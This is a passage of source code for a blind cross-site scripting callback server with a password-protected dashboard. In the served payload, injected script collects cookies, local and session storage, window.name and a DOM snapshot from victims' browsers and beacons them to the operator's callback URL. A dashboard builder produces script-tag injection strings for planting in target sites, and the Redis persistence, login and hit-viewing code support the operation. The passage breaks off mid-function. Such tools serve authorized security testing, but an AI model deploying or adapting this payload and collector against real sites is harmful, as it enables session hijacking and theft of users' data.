    language: String(navigator.language || ""),
    viewport: String(window.innerWidth || "") + "x" + String(window.innerHeight || ""),
    title: safeGet(() => document.title),
    origin: safeGet(() => location.origin),
    windowName: safeGet(() => window.name),
    cookies: truncate(cookies, 2000),
    localStorage: localStorageData,
    sessionStorage: sessionStorageData,
    domSnapshot
  };

  const body = JSON.stringify(payload);

  try {
    if (navigator.sendBeacon) {
      const blob = new Blob([body], { type: "application/json" });
      if (navigator.sendBeacon(${callbackUrl}, blob)) {
        return;
      }
    }
  } catch (_) {}

  try {
    fetch(${callbackUrl}, {
      method: "POST",
      mode: "no-cors",
      keepalive: true,
      headers: { "Content-Type": "application/json" },
      body
    }).catch(() => {});
  } catch (_) {}

  try {
    const image = new Image();
    image.src = ${imageBaseUrl} + encodeURIComponent(payload.marker) + ".gif?u=" +
      encodeURIComponent(payload.pageUrl) + "&r=" + encodeURIComponent(payload.referrer) +
      "&t=" + Date.now();
  } catch (_) {}
})();`;
}

function markerFromPath(markerPath) {
  return String(markerPath || "").replace(/^\/+/, "").replace(/\/+$/, "") || "blind-xss";
}

function pageKeyForEntry(entry) {
  return String(entry.pageUrl || entry.referrer || "Unknown page");
}

function readCallbacks(limit = 500) {
  if (!fs.existsSync(logFile)) {
    return [];
  }

  const callbacks = fs.readFileSync(logFile, "utf8")
    .split(/\r?\n/)
    .filter(Boolean)
    .map((line) => {
      try {
        return JSON.parse(line);
      } catch {
        return null;
      }
    })
    .filter(Boolean);

  return limit === null ? callbacks : callbacks.slice(-limit);
}

// ---------------------------------------------------------------------------
// Optional free-tier persistence: mirror the JSONL log to Upstash Redis (REST).
// Render free instances have an ephemeral filesystem, so without this the log
// is wiped on every redeploy/spin-down. Set UPSTASH_REDIS_REST_URL and
// UPSTASH_REDIS_REST_TOKEN to enable. The local file stays the read source.
// ---------------------------------------------------------------------------

// Send a single command as a JSON array in the POST body. Upstash appends a
// plain POST body as one argument, so passing an array is the only way to
// guarantee the stored list element is the raw JSON line (not `["{...}"]`).
async function redisRequest(command) {
  const response = await fetch(redisUrl, {
    method: "POST",
    headers: {
      "Authorization": `Bearer ${redisToken}`,
      "Content-Type": "application/json"
    },
    body: JSON.stringify(command)
  });

  if (!response.ok) {
    throw new Error(`HTTP ${response.status}`);
  }

  const data = await response.json();
  if (data && data.error) {
    throw new Error(data.error);
  }

  return data ? data.result : null;
}

async function redisPipeline(commands) {
  const response = await fetch(`${redisUrl}/pipeline`, {
    method: "POST",
    headers: {
      "Authorization": `Bearer ${redisToken}`,
      "Content-Type": "application/json"
    },
    body: JSON.stringify(commands)
  });

  if (!response.ok) {
    throw new Error(`HTTP ${response.status}`);
  }

  const data = await response.json();
  if (!Array.isArray(data)) {
    throw new Error(data && data.error ? data.error : "unexpected pipeline response");
  }

  const failed = data.find((item) => item && item.error);
  if (failed) {
    throw new Error(failed.error);
  }

  return data;
}

// Older builds posted `[json]` as a plain body, which Upstash stored as the
// literal string `["{...}"]`. Unwrap those (and old multi-entry chunks) so the
// restored JSONL file stays parseable after the write-format fix.
function normalizeStoredItem(item) {
  if (typeof item !== "string") {
    return [JSON.stringify(item)];
  }

  const trimmed = item.trim();
  if (trimmed.startsWith("[")) {
    try {
      const parsed = JSON.parse(trimmed);
      if (Array.isArray(parsed)) {
        return parsed.flatMap((inner) =>
          normalizeStoredItem(typeof inner === "string" ? inner : JSON.stringify(inner))
        );
      }
    } catch {
      // Not a JSON array; keep the raw value.
    }
  }

  return [item];
}

async function restoreFromRedis() {
  if (!redisEnabled) {
    return;
  }

  // Keep any local log that already survived (e.g. when a real disk is mounted).
  if (fs.existsSync(logFile) && fs.statSync(logFile).size > 0) {
    return;
  }

  try {
    // Page the read so a large log never trips the 10MB request/response cap.
    const items = [];
    const PAGE = 10;
    let start = 0;
    while (true) {
      const page = await redisRequest(["LRANGE", redisKey, String(start), String(start + PAGE - 1)]);
      if (!Array.isArray(page) || !page.length) {
        break;
      }
      for (const item of page) {
        items.push(...normalizeStoredItem(item));
      }
      if (page.length < PAGE) {
        break;
      }
      start += PAGE;
    }

    if (items.length) {
      fs.writeFileSync(logFile, items.join("\n") + "\n", "utf8");
      console.log(`Restored ${items.length} callbacks from Upstash Redis`);
    }
  } catch (error) {
    console.error("Upstash restore failed:", error.message);
  }
}

async function redisAppend(entry) {
  if (!redisEnabled) {
    return;
  }

  try {
    await redisRequest(["RPUSH", redisKey, JSON.stringify(entry)]);
  } catch (error) {
    console.error("Upstash append failed:", error.message);
  }
}

async function redisAppendMany(entries) {
  if (!redisEnabled || !entries.length) {
    return;
  }

  // Batch by size rather than count so large screenshot hits stay under the cap.
  const MAX_BATCH_BYTES = 4 * 1024 * 1024;
  let batch = [];
  let batchBytes = 0;
  let failed = false;

  const flush = async () => {
    if (!batch.length) {
      return;
    }
    try {
      await redisPipeline(batch);
    } catch (error) {
      failed = true;
      console.error("Upstash bulk append failed:", error.message);
    } finally {
      batch = [];
      batchBytes = 0;
    }
  };

  for (const entry of entries) {
    if (failed) {
      return;
    }
    const json = JSON.stringify(entry);
    if (batch.length && batchBytes + json.length > MAX_BATCH_BYTES) {
      await flush();
    }
    batch.push(["RPUSH", redisKey, json]);
    batchBytes += json.length;
  }

  await flush();
}

async function redisClear() {
  if (!redisEnabled) {
    return;
  }

  try {
    await redisRequest(["DEL", redisKey]);
  } catch (error) {
    console.error("Upstash clear failed:", error.message);
  }
}

async function redisReplace(entries) {
  if (!redisEnabled) {
    return;
  }

  await redisClear();
  await redisAppendMany(entries);
}

function buildLoginPage(hasError = false, message = "Invalid password.", next = "/dashboard") {
  return `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Dashboard Login</title>
  <style>
    :root {
      color-scheme: dark;
      --bg: #101214;
      --panel: #171b1f;
      --panel-2: #20262b;
      --text: #edf2f7;
      --muted: #9aa7b2;
      --line: #303941;
      --accent: #20c997;
      --danger: #ff6b6b;
    }
    * { box-sizing: border-box; }
    body {
      min-height: 100vh;
      margin: 0;
      display: grid;
      place-items: center;
      padding: 20px;
      background: var(--bg);
      color: var(--text);
      font: 14px/1.5 system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    }
    form {
      width: min(420px, 100%);
      background: var(--panel);
      border: 1px solid var(--line);
      border-radius: 8px;
      padding: 22px;
      display: grid;
      gap: 14px;
    }
    h1 { margin: 0; font-size: 20px; }
    p { margin: 0; color: var(--muted); }
    label { color: var(--muted); }
    input, button {
      min-height: 42px;
      border-radius: 6px;
      border: 1px solid var(--line);
      background: var(--panel-2);
      color: var(--text);
      font: inherit;
      padding: 9px 11px;
    }
    button {
      cursor: pointer;
      background: var(--accent);
      color: #07110e;
      border-color: var(--accent);
      font-weight: 700;
    }
    .error {
      border: 1px solid rgba(255, 107, 107, 0.5);
      background: rgba(255, 107, 107, 0.12);
      color: var(--danger);
      border-radius: 6px;
      padding: 9px 11px;
    }
  </style>
</head>
<body>
  <form method="post" action="/login" autocomplete="off">
    <input type="hidden" name="next" value="${escapeHtml(next)}">
    <h1>Blind XSS Dashboard</h1>
    <p>Enter the dashboard password to continue.</p>
    ${hasError ? `<div class="error">${escapeHtml(message)}</div>` : ""}
    <label for="username">Username</label>
    <input id="username" name="username" type="text" autocomplete="username" autofocus required>
    <label for="password">Password</label>
    <input id="password" name="password" type="password" autocomplete="current-password" required>
    <button type="submit">Login</button>
  </form>
</body>
</html>`;
}

function buildDashboard(baseUrl) {
  const samplePayload = `<script src="${baseUrl}/x/blind-xss"></script>"/><script src="${baseUrl}/x/blind-xss1"></script>`;

  return `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Blind XSS Dashboard</title>
  <style>
    :root {
      color-scheme: dark;
      --bg: #0b0e11;
      --bg-2: #0f1418;
      --panel: #141a20;
      --panel-2: #1a222a;
      --line: #263039;
      --line-2: #33414d;
      --text: #e9eff5;
      --muted: #93a2af;
      --accent: #2ee6a6;
      --accent-soft: rgba(46, 230, 166, 0.12);
      --blue: #62b6ff;
      --warn: #f6c453;
      --warn-soft: rgba(246, 196, 83, 0.12);
      --danger: #ff7a8a;
      --danger-soft: rgba(255, 122, 138, 0.12);
      --radius: 12px;
    }
    * { box-sizing: border-box; }
    [hidden] { display: none !important; }
    html, body { min-height: 100%; }
    body {
      margin: 0;
      background:
        radial-gradient(900px 520px at 12% -12%, rgba(46, 230, 166, 0.10), transparent 60%),
        radial-gradient(900px 520px at 100% 0%, rgba(98, 182, 255, 0.08), transparent 55%),
        var(--bg);
      color: var(--text);
      font: 14px/1.55 system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }
    a { color: var(--blue); }
    button, input { font: inherit; }
    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }

    .topbar {
      position: sticky; top: 0; z-index: 60;
      display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between;
      gap: 14px; padding: 14px 24px;
      background: rgba(11, 14, 17, 0.85);
      backdrop-filter: blur(10px);
      border-bottom: 1px solid var(--line);
    }
    .brand { display: flex; align-items: center; gap: 12px; min-width: 0; }
    .logo {
      width: 38px; height: 38px; flex: none;
      display: grid; place-items: center;
      border-radius: 10px;
      background: linear-gradient(145deg, var(--accent), #0e9f74);
      color: #05231a; font-size: 20px; font-weight: 800;
      box-shadow: 0 6px 18px rgba(46, 230, 166, 0.25);
    }
    .brand h1 { margin: 0; font-size: 17px; font-weight: 700; letter-spacing: 0.01em; }
    .brand .sub { color: var(--muted); font-size: 12px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
    .brand .sub .mono { color: var(--text); }
    .topbar-actions { display: flex; flex-wrap: wrap; align-items: center; gap: 8px; }
    .topbar-actions form { margin: 0; }

    .btn {
      display: inline-flex; align-items: center; justify-content: center; gap: 6px;
      min-height: 36px; padding: 7px 13px;
      border: 1px solid var(--line-2); border-radius: 9px;
      background: var(--panel-2); color: var(--text);
      cursor: pointer; white-space: nowrap;
      transition: border-color 0.15s ease, background 0.15s ease, transform 0.05s ease;
    }
    .btn:hover { border-color: var(--accent); background: #1f2830; }
    .btn:active { transform: translateY(1px); }
    .btn.ghost { background: transparent; }
    .btn.danger { color: var(--danger); border-color: rgba(255, 122, 138, 0.35); }
    .btn.danger:hover { background: var(--danger-soft); border-color: var(--danger); }
    .btn.primary { background: var(--accent); border-color: var(--accent); color: #04241a; font-weight: 650; }
    .btn.primary:hover { background: #4bebba; }

    .pill {
      display: inline-flex; align-items: center; gap: 6px;
      min-height: 30px; padding: 3px 10px;
      border: 1px solid var(--line); border-radius: 999px;
      background: var(--panel); color: var(--muted);
      font-size: 12px; white-space: nowrap;
    }
    .pill.subtle { background: transparent; }
    .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--accent); box-shadow: 0 0 0 3px var(--accent-soft); }
    .toggle { display: inline-flex; align-items: center; gap: 7px; color: var(--muted); font-size: 12px; cursor: pointer; user-select: none; }
    .toggle input { accent-color: var(--accent); margin: 0; }

    .wrap { width: 100%; max-width: none; padding: 20px 28px 40px; display: grid; gap: 16px; }
    .stats-row { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 12px; }
    .stat {
      display: flex; align-items: baseline; gap: 10px; padding: 14px 16px;
      background: linear-gradient(180deg, var(--panel), var(--bg-2));
      border: 1px solid var(--line); border-radius: var(--radius);
    }
    .stat strong { font-size: 26px; line-height: 1; font-weight: 750; }
    .stat span { color: var(--muted); font-size: 12px; text-transform: uppercase; letter-spacing: 0.08em; }

    .panel { background: var(--panel); border: 1px solid var(--line); border-radius: var(--radius); overflow: hidden; }
    .panel-head {
      display: flex; align-items: center; justify-content: space-between; gap: 12px;
      padding: 14px 16px; border-bottom: 1px solid var(--line);
      background: rgba(255, 255, 255, 0.015);
    }
    .panel-head h2 { margin: 0; font-size: 14px; font-weight: 700; }
    .hint { margin: 2px 0 0; color: var(--muted); font-size: 12px; }

    .builder-head {
      display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between;
      gap: 12px; padding: 14px 16px 0;
    }
    .builder-head h2 { margin: 0; font-size: 14px; font-weight: 700; }
    .builder-inputs { display: flex; gap: 8px; align-items: center; }
    .builder-inputs input { width: 240px; }
    .builder code {
      display: block; margin: 12px 16px 16px; padding: 12px 14px;
      border: 1px solid var(--line); border-radius: 9px;
      background: #0a0e11; color: #cde7dc;
      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
      font-size: 12px; overflow-x: auto; white-space: nowrap;
    }

    input {
      width: 100%; min-height: 36px; padding: 7px 11px;
      border: 1px solid var(--line-2); border-radius: 9px;
      background: var(--panel-2); color: var(--text); min-width: 0;
    }
    input:focus { outline: none; border-color: var(--accent); box-shadow: 0 0 0 3px var(--accent-soft); }
    input::placeholder { color: #6d7d8a; }
    input[type="checkbox"] { width: auto; min-height: auto; }
    input[type="file"] { padding: 6px 8px; font-size: 12px; }

    .workspace { display: grid; grid-template-columns: clamp(260px, 18vw, 360px) minmax(0, 1fr); gap: 16px; align-items: start; }
    .pages-panel { position: sticky; top: 84px; display: flex; flex-direction: column; max-height: calc(100vh - 104px); }
    .pages-panel .groups { overflow-y: auto; }
    .groups { display: grid; gap: 8px; padding: 10px; }

    .group-card {
      display: grid; gap: 3px; width: 100%;
      padding: 10px 12px; border: 1px solid var(--line); border-radius: 10px;
      background: var(--panel-2); color: inherit;
      font: inherit; text-align: left; cursor: pointer;
      transition: border-color 0.15s ease, background 0.15s ease;
    }
    .group-card:hover { border-color: var(--line-2); }
    .group-card.active { border-color: var(--accent); background: linear-gradient(90deg, var(--accent-soft), var(--panel-2) 60%); }
    .group-title { font-weight: 650; font-size: 13px; overflow-wrap: anywhere; }
    .group-meta { color: var(--muted); font-size: 11px; }
    .group-card:hover .group-title { color: var(--accent); }




    .hits-panel { display: flex; flex-direction: column; }
    .hits-head { gap: 10px; }
    .hits-actions { display: flex; flex-wrap: wrap; gap: 8px; justify-content: flex-end; }
    .filters {
      display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)) auto; gap: 8px;
      padding: 10px 12px; border-bottom: 1px solid var(--line);
      background: rgba(255, 255, 255, 0.01);
    }
    .filters input { min-height: 34px; font-size: 13px; }
    .hits { display: grid; gap: 10px; padding: 12px; }

    .hit { border: 1px solid var(--line); border-radius: 10px; background: var(--panel-2); overflow: hidden; transition: border-color 0.15s ease; }
    .hit:hover { border-color: var(--line-2); }
    .hit.open { border-color: var(--accent); }
    .hit-summary {
      width: 100%; display: grid; grid-template-columns: minmax(0, 1fr) auto;
      align-items: center; gap: 12px; padding: 12px 14px; cursor: pointer; min-height: 0;
    }
    .hit-summary:hover { background: rgba(255, 255, 255, 0.02); }
    .hit-summary:focus-visible { outline: 2px solid var(--accent); outline-offset: -2px; }
    .hit-main { min-width: 0; display: grid; gap: 4px; }
    .hit-badges { display: flex; flex-wrap: wrap; align-items: center; gap: 6px; }
    .badge {
      font-size: 11px; padding: 1px 8px;
      border: 1px solid var(--line); border-radius: 999px;
      color: var(--muted); background: #10161b;
    }
    .badge.exec { color: var(--accent); border-color: rgba(46, 230, 166, 0.35); background: var(--accent-soft); }
    .badge.fetch { color: var(--warn); border-color: rgba(246, 196, 83, 0.35); background: var(--warn-soft); }
    .marker { color: var(--accent); font-weight: 700; font-size: 13px; }
    .hit-title { font-weight: 600; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
    .hit-url { color: var(--muted); font-size: 12px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
    .hit-url a { color: var(--blue); text-decoration: none; }
    .hit-url a:hover { text-decoration: underline; }
    .hit-side { display: grid; justify-items: end; gap: 2px; color: var(--muted); font-size: 12px; white-space: nowrap; }
    .hit-time { color: var(--text); font-size: 12px; }
    .hit-ip { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 11px; }
    .chevron { color: var(--muted); font-size: 15px; line-height: 1; transition: transform 0.15s ease; }
    .hit.open .chevron { transform: rotate(180deg); color: var(--accent); }

    .hit-detail { display: none; padding: 14px; border-top: 1px solid var(--line); background: rgba(0, 0, 0, 0.15); }
    .hit.open .hit-detail { display: block; }
    .shot { display: flex; justify-content: center; margin-bottom: 12px; }
    .shot img { display: block; max-width: 100%; max-height: 72vh; width: auto; height: auto; border-radius: 9px; border: 1px solid var(--line-2); background: #000; }
    .detail-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 10px; }
    .detail-card { padding: 10px 12px; border: 1px solid var(--line); border-radius: 9px; background: #0e1418; }
    .detail-card h4 {
      margin: 0 0 7px; font-size: 11px; font-weight: 700;
      letter-spacing: 0.06em; text-transform: uppercase; color: var(--muted);
    }
    .detail-card pre {
      margin: 0; max-height: 220px; overflow: auto;
      white-space: pre-wrap; word-break: break-word; font-size: 12px; color: #d6e2ea;
    }
    .meta { margin-top: 12px; border-top: 1px dashed var(--line); padding-top: 10px; }
    .meta summary { cursor: pointer; color: var(--muted); font-size: 12px; user-select: none; }
    .meta summary:hover { color: var(--text); }
    .meta dl { margin: 10px 0 0; display: grid; grid-template-columns: 120px minmax(0, 1fr); gap: 6px 14px; font-size: 12px; }
    .meta dt { color: var(--muted); }
    .meta dd { margin: 0; overflow-wrap: anywhere; }

    .empty { padding: 30px 18px; text-align: center; color: var(--muted); }
    .empty.small { padding: 12px; font-size: 12px; }
    .modal-overlay {
      display: none; position: fixed; inset: 0; z-index: 2000;
      align-items: center; justify-content: center; padding: 16px;
      background: rgba(4, 7, 9, 0.72); backdrop-filter: blur(3px);
    }
    .modal-overlay.open { display: flex; }
    .modal {
      width: min(520px, 100%); background: var(--panel);
      border: 1px solid var(--line-2); border-radius: 14px;
      box-shadow: 0 30px 70px rgba(0, 0, 0, 0.6); overflow: hidden;
    }
    .modal-header {
      display: flex; align-items: center; justify-content: space-between; gap: 10px;
      padding: 14px 16px; border-bottom: 1px solid var(--line);
    }
    .modal-header h2 { margin: 0; font-size: 14px; }
    .modal-body { display: grid; gap: 12px; padding: 16px; }
    .modal-close {
      width: 32px; min-height: 32px; padding: 0; border: 0; border-radius: 8px;
      background: transparent; color: var(--muted); font-size: 18px; cursor: pointer;
    }
    .modal-close:hover { background: var(--panel-2); color: var(--text); }
    .import-row { display: grid; grid-template-columns: minmax(0, 1fr) auto; gap: 10px; align-items: center; }

    @media (max-width: 960px) {
      .workspace { grid-template-columns: 1fr; }
      .pages-panel { position: static; max-height: none; }
      .pages-panel .groups { max-height: 300px; }
    }
    @media (max-width: 720px) {
      .topbar { padding: 12px 14px; }
      .wrap { padding: 14px 14px 30px; }
      .stats-row { gap: 8px; }
      .stat { padding: 10px 12px; flex-direction: column; align-items: flex-start; gap: 2px; }
      .stat strong { font-size: 20px; }
      .builder-inputs { width: 100%; }
      .builder-inputs input { width: 100%; }
      .filters { grid-template-columns: 1fr; }
      .hit-title, .hit-url { white-space: normal; }
      .meta dl { grid-template-columns: 90px minmax(0, 1fr); }
    }
  </style>
</head>
<body>
  <header class="topbar">
    <div class="brand">
      <span class="logo" aria-hidden="true">◈</span>
      <div>
        <h1>Blind XSS</h1>
        <div class="sub">Serving from <span class="mono" id="base-url">${escapeHtml(baseUrl)}</span></div>
      </div>
    </div>
    <div class="topbar-actions">
      <span class="pill"><span class="dot" aria-hidden="true"></span><span id="last-refresh">Connecting…</span></span>
      <label class="toggle" title="Show payload-load/image hits (script fetched but not executed)">
        <input type="checkbox" id="show-fetch" checked>
        <span>Fetch-only</span>
      </label>
      <button class="btn ghost" id="refresh" type="button">Refresh</button>
      <button class="btn ghost" id="open-import" type="button">Import / Export</button>
      <form method="post" action="/logout"><button class="btn ghost" type="submit">Logout</button></form>
    </div>
  </header>

  <main class="wrap">
    <section class="stats-row" aria-label="Summary">
      <div class="stat"><strong id="total">0</strong><span>hits</span></div>
      <div class="stat"><strong id="unique">0</strong><span>markers</span></div>
      <div class="stat"><strong id="pages-count">0</strong><span>pages</span></div>
    </section>

    <section class="panel builder">
      <div class="builder-head">
        <div>
          <h2>Payload</h2>
          <p class="hint">Use a unique marker for each injection point.</p>
        </div>
        <div class="builder-inputs">
          <input id="marker" value="blind-xss" spellcheck="false" aria-label="Unique marker">
          <button class="btn primary" id="copy" type="button">Copy</button>
        </div>
      </div>
      <code id="payload">${escapeHtml(samplePayload)}</code>
    </section>

    <div class="workspace">
      <aside class="panel pages-panel">
        <div class="panel-head">
          <h2>Pages</h2>
          <span class="pill subtle" id="pages-meta">0</span>
        </div>
        <div id="groups" class="groups"></div>
      </aside>

      <section class="panel hits-panel">
        <div class="panel-head hits-head">
          <div>
            <h2 id="details-title">Hits</h2>
            <p class="hint" id="details-sub">No hits yet.</p>
          </div>
          <div class="hits-actions">
            <button class="btn ghost" id="page-copy" type="button" hidden>Copy URL</button>
            <button class="btn danger" id="page-delete" type="button" hidden>Delete page</button>
            <button class="btn danger" id="clear-all" type="button">Clear all</button>
          </div>
        </div>
        <div class="filters">
          <input id="filter-page" placeholder="Filter page URL" list="page-suggestions" aria-label="Filter page URL">
          <input id="filter-ip" placeholder="Filter IP" list="ip-suggestions" aria-label="Filter IP">
          <input id="filter-marker" placeholder="Filter marker" list="marker-suggestions" aria-label="Filter marker">
          <button class="btn ghost" id="clear-filters" type="button">Reset</button>
        </div>
        <div id="callbacks" class="hits"></div>
      </section>
    </div>

    <datalist id="page-suggestions"></datalist>
    <datalist id="ip-suggestions"></datalist>
    <datalist id="marker-suggestions"></datalist>

    <div class="modal-overlay" id="modal-import">
      <div class="modal">
        <div class="modal-header">
          <h2>Import / Export</h2>
          <button class="modal-close" id="close-import" type="button" aria-label="Close">✕</button>
        </div>
        <div class="modal-body">
          <button class="btn" id="download-hits" type="button">Download hits</button>
          <div class="import-row">
            <input id="import-file" type="file" accept=".jsonl,.json,application/json,application/x-ndjson">
            <button class="btn" id="append-import" type="button">Add to logs</button>
          </div>
          <div id="import-preview" class="hint">No import file selected.</div>
        </div>
      </div>
    </div>
  </main>

  <script>
    const baseUrl = ${JSON.stringify(baseUrl)};
    const markerInput = document.querySelector("#marker");
    const payloadCode = document.querySelector("#payload");
    const groupsEl = document.querySelector("#groups");
    const callbacksEl = document.querySelector("#callbacks");
    const detailsTitleEl = document.querySelector("#details-title");
    const detailsSubEl = document.querySelector("#details-sub");
    const pagesMetaEl = document.querySelector("#pages-meta");
    const pageSuggestionsEl = document.querySelector("#page-suggestions");
    const ipSuggestionsEl = document.querySelector("#ip-suggestions");
    const markerSuggestionsEl = document.querySelector("#marker-suggestions");
    const importFileEl = document.querySelector("#import-file");
    const importPreviewEl = document.querySelector("#import-preview");
    const totalEl = document.querySelector("#total");
    const uniqueEl = document.querySelector("#unique");
    const pagesCountEl = document.querySelector("#pages-count");
    const refreshEl = document.querySelector("#last-refresh");
    const filters = {
      page: document.querySelector("#filter-page"),
      ip: document.querySelector("#filter-ip"),
      marker: document.querySelector("#filter-marker")
    };
    let allCallbacks = [];
    let activeGroupKey = "";
    let importPreviewEntries = [];
    let showFetch = true;
    const expandedHits = new Set();
    let hitIndex = new Map();
    let lastSignature = "";

    function payloadForMarker(marker) {
      const clean = marker.replace(/^\\/+/, "").trim() || "blind-xss";
      return '<script src="' + baseUrl + '/x/' + clean + '"></' + 'script>"/><script src="' +
        baseUrl + '/x/' + clean + '1"></' + 'script>';
    }

    function updatePayload() {
      payloadCode.textContent = payloadForMarker(markerInput.value);
    }

    markerInput.addEventListener("input", updatePayload);
    document.querySelector("#copy").addEventListener("click", async () => {
      updatePayload();
      await navigator.clipboard.writeText(payloadCode.textContent);
    });
    document.querySelector("#refresh").addEventListener("click", loadCallbacks);
    document.querySelector("#show-fetch").addEventListener("change", (event) => {
      showFetch = event.target.checked;
      activeGroupKey = "";
      renderCallbacks(allCallbacks);
    });
    document.querySelector("#download-hits").addEventListener("click", () => {
      location.href = "/api/callbacks/download";
    });
    document.querySelector("#append-import").addEventListener("click", appendImportFile);
    importFileEl.addEventListener("change", async () => {
      importPreviewEntries = [];
      await previewImportFile();
    });
    document.querySelector("#clear-all").addEventListener("click", async () => {
      if (!confirm("Clear all dashboard hits?")) {
        return;
      }

      const data = await postJson("/api/callbacks/clear", {});
      allCallbacks = data.callbacks || [];
      activeGroupKey = "";
      expandedHits.clear();
      renderCallbacks(allCallbacks);
      updateSuggestions(allCallbacks);
    });
    document.querySelector("#clear-filters").addEventListener("click", () => {
      Object.values(filters).forEach((input) => {
        input.value = "";
      });
      activeGroupKey = "";
      renderCallbacks(allCallbacks);
    });
    Object.values(filters).forEach((input) => {
      input.addEventListener("input", () => renderCallbacks(allCallbacks));
    });
    document.querySelector("#page-copy").addEventListener("click", async () => {
      if (activeGroupKey) {
        await navigator.clipboard.writeText(activeGroupKey);
      }
    });
    document.querySelector("#page-delete").addEventListener("click", async () => {
      if (!activeGroupKey || !confirm("Delete all hits for this page URL?")) {
        return;
      }

      const data = await postJson("/api/callbacks/delete-page", { pageKey: activeGroupKey });
      allCallbacks = data.callbacks || [];
      activeGroupKey = "";
      expandedHits.clear();
      renderCallbacks(allCallbacks);
      updateSuggestions(allCallbacks);
    });


    function openModal(id) { document.getElementById(id).classList.add("open"); }
    function closeModal(id) { document.getElementById(id).classList.remove("open"); }
    document.querySelector("#open-import").addEventListener("click", () => openModal("modal-import"));
    document.querySelector("#close-import").addEventListener("click", () => closeModal("modal-import"));
    document.querySelector("#modal-import").addEventListener("click", (event) => {
      if (event.target === event.currentTarget) closeModal("modal-import");
    });
    document.addEventListener("keydown", (event) => {
      if (event.key === "Escape") closeModal("modal-import");
    });

    async function loadCallbacks() {
      const response = await fetch("/api/callbacks", { cache: "no-store" });
      if (response.status === 401) {
        location.href = "/login";
        return;
      }

      const data = await response.json();
      allCallbacks = data.callbacks || [];
      const signature = signatureOf(allCallbacks);
      if (signature !== lastSignature) {
        lastSignature = signature;
        renderCallbacks(allCallbacks);
        updateSuggestions(allCallbacks);
      }
      refreshEl.textContent = "Updated " + new Date().toLocaleTimeString();
      handleDeepLink();
    }

    async function postJson(url, body) {
      const response = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body)
      });

      if (response.status === 401) {
        location.href = "/login";
        return { callbacks: [] };
      }

      return response.json();
    }

    function handleDeepLink() {
      const match = location.hash.match(/^#hit=(.+)$/);
      if (!match) {
        return;
      }

      const slug = match[1];
      const target = allCallbacks.find((cb) => {
        const id = (cb.receivedAt || "").replace(/[^a-zA-Z0-9]/g, "-");
        return id === slug;
      });

      if (!target) {
        return;
      }

      if (isFetchOnly(target) && !showFetch) {
        showFetch = true;
        document.querySelector("#show-fetch").checked = true;
      }

      const key = hitKey(target);
      activeGroupKey = pageKey(target);
      expandedHits.add(key);
      history.replaceState(null, "", location.pathname);
      renderCallbacks(allCallbacks);

      let card = null;
      callbacksEl.querySelectorAll(".hit").forEach((el) => {
        if (el.dataset.key === key) {
          card = el;
        }
      });

      if (card) {
        card.classList.add("open");
        const summary = card.querySelector(".hit-summary");
        if (summary) {
          summary.setAttribute("aria-expanded", "true");
        }
        card.scrollIntoView({ behavior: "smooth", block: "center" });
        card.style.outline = "2px solid var(--warn)";
        setTimeout(() => { card.style.outline = ""; }, 1600);
      }
    }

    async function previewImportFile() {
      const file = importFileEl.files && importFileEl.files[0];
      if (!file) {
        importPreviewEl.textContent = "Choose a JSONL or JSON file first.";
        return;
      }

      const text = await file.text();
      importPreviewEntries = parseImportText(text);
      if (!importPreviewEntries.length) {
        importPreviewEl.textContent = "No valid hit entries found in this file.";
        return;
      }

      const groups = groupCallbacks(importPreviewEntries);
      importPreviewEl.innerHTML = "<strong>" + importPreviewEntries.length + " hits ready to preview.</strong><br>" +
        groups.slice(0, 8).map((group) => escapeHtml(group.label) + " (" + group.hits.length + " hits)").join("<br>") +
        (groups.length > 8 ? "<br>..." : "");
    }

    async function appendImportFile() {
      if (!importPreviewEntries.length) {
        await previewImportFile();
      }

      if (!importPreviewEntries.length) {
        return;
      }

      if (!confirm("Add " + importPreviewEntries.length + " imported hits to the current logs?")) {
        return;
      }

      const data = await postJson("/api/callbacks/import", { entries: importPreviewEntries });
      allCallbacks = data.callbacks || [];
      importPreviewEl.textContent = "Imported " + (data.imported || 0) + " hits.";
      importPreviewEntries = [];
      renderCallbacks(allCallbacks);
      updateSuggestions(allCallbacks);
    }

    function parseImportText(text) {
      try {
        const parsed = JSON.parse(text);
        if (Array.isArray(parsed)) {
          return parsed.map(normalizeImportEntry).filter(Boolean);
        }
        if (Array.isArray(parsed.callbacks)) {
          return parsed.callbacks.map(normalizeImportEntry).filter(Boolean);
        }
      } catch (_) {}

      return text.split(/\\r?\\n/)
        .map((line) => line.trim())
        .filter(Boolean)
        .map((line) => {
          try {
            return normalizeImportEntry(JSON.parse(line));
          } catch {
            return null;
          }
        })
        .filter(Boolean);
    }

    function normalizeImportEntry(entry) {
      if (!entry || typeof entry !== "object") {
        return null;
      }

      return {
        receivedAt: entry.receivedAt || new Date().toISOString(),
        ip: entry.ip || "",
        marker: entry.marker || "unknown",
        pageUrl: entry.pageUrl || "",
        referrer: entry.referrer || "",
        userAgent: entry.userAgent || "",
        language: entry.language || "",
        viewport: entry.viewport || "",
        title: entry.title || "",
        origin: entry.origin || "",
        windowName: entry.windowName || "",
        cookies: entry.cookies || "",
        localStorage: entry.localStorage || "",
        sessionStorage: entry.sessionStorage || "",
        domSnapshot: entry.domSnapshot || "",
        rawBody: entry.rawBody || "",
        source: entry.source || "import"
      };
    }

    function signatureOf(list) {
      let hash = 2166136261;
      const text = list.map((item) => [
        item.receivedAt || "",
        item.marker || "",
        item.source || "",
        item.cookies ? item.cookies.length : 0,
